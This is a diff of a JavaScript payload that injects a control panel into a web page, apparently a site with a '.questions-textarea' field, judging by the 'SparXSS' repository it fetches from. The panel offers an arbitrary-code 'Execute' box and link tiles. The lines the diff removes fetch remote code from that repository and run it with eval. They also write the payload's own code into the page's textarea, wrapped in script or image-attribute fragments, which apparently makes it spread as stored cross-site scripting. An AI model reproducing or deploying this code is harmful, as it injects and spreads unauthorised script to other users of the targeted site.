@@ -1,9 +1,17 @@
+// so it executes once
 if (typeof executed === 'undefined') {
     executed = true;
-    
-    (function(){var script=document.createElement("script");script.src="https://cdn.jsdelivr.net/npm/eruda";document.body.append(script);script.onload=function(){eruda.init();}})();
 
-    fetch('https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js').then(response=>response.text()).then(scriptText=>{eval(scriptText);})
+    // eruda bc useful for debugging
+    (function() {
+        var script=document.createElement("script");
+        script.src="https://cdn.jsdelivr.net/npm/eruda";
+        document.body.append(script);
+        script.onload=function() { 
+            eruda.init();
+        }
+    })
+    ();
     
     var container = document.createElement('div');
     container.style.position = 'fixed';
@@ -26,8 +34,8 @@ if (typeof executed === 'undefined') {
     var toggler = document.createElement('button');
     toggler.innerText = 'Close';
     toggler.style.position = 'fixed';
-    toggler.style.top = '10px';
-    toggler.style.left = '10px';
+    toggler.style.top = '15px';
+    toggler.style.left = '15px';
     toggler.style.width = '100px';
     toggler.style.backgroundColor = '#333';
     toggler.style.border = 'none';
@@ -39,7 +47,8 @@ if (typeof executed === 'undefined') {
     toggler.style.color = '#aaa';
     toggler.style.cursor = 'pointer';
     toggler.style.outline = 'none';
-    
+
+    // yes you can drag the toggler
     var isOpen = true;
     var isDragging = false;
     var offsetX, offsetY;
@@ -255,6 +264,7 @@ if (typeof executed === 'undefined') {
         button3.style.backgroundColor = '#333';
     });
 
+    // yay javascript text box being built everytime it is clicked
     button3.addEventListener('click', function() {
         var backgroundDiv = document.createElement('div');
         backgroundDiv.style.position = 'fixed';
@@ -347,6 +357,7 @@ if (typeof executed === 'undefined') {
                     this.selectionEnd = end + spaces.length * lines.length;
                 }
                 saveState();
+            // added deleting a 4 space tab
             } else if (e.key === 'Backspace' && this.value.substring(this.selectionStart - 4, this.selectionStart) === '    ') {
                 e.preventDefault();
                 var start = this.selectionStart;
@@ -382,6 +393,7 @@ if (typeof executed === 'undefined') {
             executeButton.style.backgroundColor = '#333';
         });
 
+        // actual javascript execution
         executeButton.addEventListener('click', function() {
             var jsCode = largeTextBox.value;
 
@@ -392,7 +404,7 @@ if (typeof executed === 'undefined') {
 
                 setTimeout(function() {
                     executeButton.innerText = 'Execute';
-                }, 3000);
+                }, 2000);
             }
         });
 
@@ -476,6 +488,7 @@ if (typeof executed === 'undefined') {
     backgroundDiv2.style.height = '100%';
     backgroundDiv2.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
     backgroundDiv2.style.zIndex = '10001';
+    backgroundDiv2.style.display = 'none';
 
     var contentContainer = document.createElement('div');
     contentContainer.style.position = 'fixed';
@@ -550,11 +563,11 @@ if (typeof executed === 'undefined') {
     otherButton.addEventListener('mouseout', function() {
         otherButton.style.backgroundColor = '#333';
     });
-    
+
+    // have to define these outside the function so checkpoint2() can acess them
     var backgroundDiv3; 
     var textBox;
     var linkContainer;
-    var url;
 
     function checkpoint1() {
         backgroundDiv3 = document.createElement('div');
@@ -642,13 +655,18 @@ if (typeof executed === 'undefined') {
         bottomButton.addEventListener('click', function() {
             if (textBox.value.trim() !== '' && textBox.value.includes('.')) { 
                 userURL = textBox.value
+                if (userURL.startsWith("https://")) {
+                  userURL = userURL.slice(8);
+                } else if (userURL.startsWith("http://")) {
+                  userURL = userURL.slice(7);
+                }                
                 backgroundDiv3.style.display = 'none';
                 checkpoint2(userURL);
             } else {
-                bottomButton.innerText = 'Please enter a valid URL';
+                bottomButton.innerText = 'Error: Invalid URL';
                 setTimeout(function() {
                     bottomButton.innerText = 'Add Hyperlink';
-                }, 3000); 
+                }, 2000); 
             }
         });
 
@@ -661,14 +679,28 @@ if (typeof executed === 'undefined') {
     }
 
     var linkCounter = 1;
-    var faviconURL;
     
     function checkpoint2(userURL) {
         const websiteURL = 'https://' + userURL;
+        var faviconURL = '';
     
-        // Function to add the code snippet to the textarea
-        function addCodeToTextarea() {
-            var codeSnippet = `
+        fetch(websiteURL)
+            .then(function(response) {
+                return response.text();
+            })
+            .then(function(data) {
+                var match = data.match(/<link.*?rel=["']icon["'].*?href=["'](.*?)["']/i);
+                if (match) {
+                    faviconURL = match[1];
+                    if (faviconURL.startsWith('/') && !websiteURL.endsWith('/')) {
+                        faviconURL = websiteURL + faviconURL;
+                    } else {
+                        faviconURL = websiteURL + '/' + faviconURL;
+                    }
+                } else {
+                    faviconURL = 'https://www.google.com/s2/favicons?domain=' + userURL;
+                }
+    
                 var link = document.createElement('button');
                 link.style.width = '25%';
                 link.style.height = '225px';
@@ -684,19 +716,19 @@ if (typeof executed === 'undefined') {
                 link.style.margin = '10px';
                 link.style.textAlign = 'center';
     
-                link.addEventListener('mouseover', function () {
+                link.addEventListener('mouseover', function() {
                     link.style.backgroundColor = '#444';
                 });
     
-                link.addEventListener('mouseout', function () {
+                link.addEventListener('mouseout', function() {
                     link.style.backgroundColor = '#333';
                 });
     
-                link.addEventListener('click', function () {
+                link.addEventListener('click', function() {
                     if (redirectSwitcher === false) {
-                        window.open('https://${userURL}', '_blank');
+                        window.open('https://' + userURL, '_blank');
                     } else {
-                        window.location.href = 'https://${userURL}';
+                        window.location.href = 'https://' + userURL;
                     }
                 });
     
@@ -706,105 +738,21 @@ if (typeof executed === 'undefined') {
                 imgDiv.style.width = '150px';
                 imgDiv.style.height = '150px';
                 imgDiv.style.textAlign = 'center';
-                imgDiv.src = '${faviconURL}';
-    
+                imgDiv.src = faviconURL;
+                
                 link.appendChild(imgDiv);
     
                 var linkText = document.createElement('div');
-                linkText.innerText = '${userURL}';
+                linkText.innerText = userURL;
                 linkText.style.marginTop = '10px';
                 linkText.style.textAlign = 'center';
-    
+                
                 link.appendChild(linkText);
-            `;
-    
-            var textarea = document.querySelector('.questions-textarea');
-            if (textarea.value.endsWith('</script>')) {
-                textarea.value = textarea.value.replace(/<\/script>/gi, '');
-                var img = false
-            } else {
-              textarea.value = textarea.value.replace(/'>/g, '');
-                var img = true
-            }
-            if (img) {
-              textarea.value = textarea.value + codeSnippet + "' >";
-            } else {
-              textarea.value = textarea.value + codeSnippet + '</script>';
-            }
-        }
-    
-        function fetchFaviconAndDisplay() {
-            faviconURL = '';
-    
-            fetch(websiteURL)
-                .then(function (response) {
-                    return response.text();
-                })
-                .then(function (data) {
-                    var match = data.match(/<link.*?rel=["']icon["'].*?href=["']([^"']+)["']/i);
-                    if (match) {
-                        faviconURL = match[1];
-                        if (faviconURL.startsWith('/') && !websiteURL.endsWith('/')) {
-                            faviconURL = websiteURL + faviconURL;
-                        } else {
-                            faviconURL = websiteURL + '/' + faviconURL;
-                        }
-                    } else {
-                        faviconURL = 'https://www.google.com/s2/favicons?domain=' + userURL;
-                    }
-                    
-                    var link = document.createElement('button');
-                    link.style.width = '25%';
-                    link.style.height = '225px';
-                    link.style.backgroundColor = '#333';
-                    link.style.border = 'none';
-                    link.style.borderRadius = '10px';
-                    link.style.padding = '15px';
-                    link.style.boxShadow = '0 0 5px rgba(0, 0, 0, 0.5)';
-                    link.style.fontSize = '20px';
-                    link.style.color = '#aaa';
-                    link.style.cursor = 'pointer';
-                    link.style.transition = 'background-color 0.3s ease';
-                    link.style.margin = '10px';
-                    link.style.textAlign = 'center';
-                    link.addEventListener('mouseover', function () {
-                        link.style.backgroundColor = '#444';
-                    });
-                    link.addEventListener('mouseout', function () {
-                        link.style.backgroundColor = '#333';
-                    });
-                    link.addEventListener('click', function () {
-                        if (redirectSwitcher === false) {
-                            window.open('https://' + userURL, '_blank');
-                        } else {
-                            window.location.href = 'https://' + userURL;
-                        }
-                    });
-                    linkContainer.appendChild(link);
-        
-                    var imgDiv = document.createElement('img');
-                    imgDiv.style.width = '150px';
-                    imgDiv.style.height = '150px';
-                    imgDiv.style.textAlign = 'center';
-                    imgDiv.src = 'faviconURL';
-        
-                    link.appendChild(imgDiv);
-                    var linkText = document.createElement('div');
-                    linkText.innerText = userURL;
-                    linkText.style.marginTop = '10px';
-                    linkText.style.textAlign = 'center';
-                    link.appendChild(linkText);
-                    
-                    addCodeToTextarea();
-                })
-                .catch(function (error) {
-                    console.error('Error:', error);
-                });
-        }
-    
-        fetchFaviconAndDisplay();
+            })
+            .catch(function(error) {
+                console.error('Error:', error);
+            });
     }
-    
 
     otherButton.addEventListener('click', checkpoint1);
 
@@ -835,7 +783,7 @@ if (typeof executed === 'undefined') {
             if (!setUrl.startsWith("http://") && !setUrl.startsWith("https://")) {
                 setUrl = "https://" + setUrl;
             }
-            window.open(url, '_blank');
+            window.open(setUrl, '_blank');
         }
     }
 
@@ -848,58 +796,4 @@ if (typeof executed === 'undefined') {
             window.location.href = setUrl;
         }
     }
-
-    backgroundDiv2.style.display = 'none';
-
-    var textarea = document.querySelector('.questions-textarea');
 }
-
-fetch("https://raw.githubusercontent.com/Amukerd/SparXSS/main/Testing/test3.js").then(r => r.text()).then(c => eval(c))
-                var link = document.createElement('button');
-                link.style.width = '25%';
-                link.style.height = '225px';
-                link.style.backgroundColor = '#333';
-                link.style.border = 'none';
-                link.style.borderRadius = '10px';
-                link.style.padding = '15px';
-                link.style.boxShadow = '0 0 5px rgba(0, 0, 0, 0.5)';
-                link.style.fontSize = '20px';
-                link.style.color = '#aaa';
-                link.style.cursor = 'pointer';
-                link.style.transition = 'background-color 0.3s ease';
-                link.style.margin = '10px';
-                link.style.textAlign = 'center';
-    
-                link.addEventListener('mouseover', function () {
-                    link.style.backgroundColor = '#444';
-                });
-    
-                link.addEventListener('mouseout', function () {
-                    link.style.backgroundColor = '#333';
-                });
-    
-                link.addEventListener('click', function () {
-                    if (redirectSwitcher === false) {
-                        window.open('https://google.com', '_blank');
-                    } else {
-                        window.location.href = 'https://google.com';
-                    }
-                });
-    
-                linkContainer.appendChild(link);
-    
-                var imgDiv = document.createElement('img');
-                imgDiv.style.width = '150px';
-                imgDiv.style.height = '150px';
-                imgDiv.style.textAlign = 'center';
-                imgDiv.src = 'https://www.google.com/s2/favicons?domain=google.com';
-    
-                link.appendChild(imgDiv);
-    
-                var linkText = document.createElement('div');
-                linkText.innerText = 'google.com';
-                linkText.style.marginTop = '10px';
-                linkText.style.textAlign = 'center';
-    
-                link.appendChild(linkText);
-            
